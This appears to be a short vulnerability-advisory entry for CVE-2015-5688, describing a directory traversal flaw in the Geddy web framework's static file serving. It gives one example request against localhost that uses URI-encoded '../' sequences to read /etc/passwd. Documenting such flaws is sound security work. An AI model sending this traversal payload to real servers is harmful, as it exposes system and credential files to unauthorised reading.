  - CVE-2015-5688
summary: |
  Directory Traversal
  Geddy static file serving allows directory traversal with a URI encoded path.

  ### Example
  ```
  http://localhost:4000/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd

  geddy is serving the output as it doesn't match the routes and it's a static file
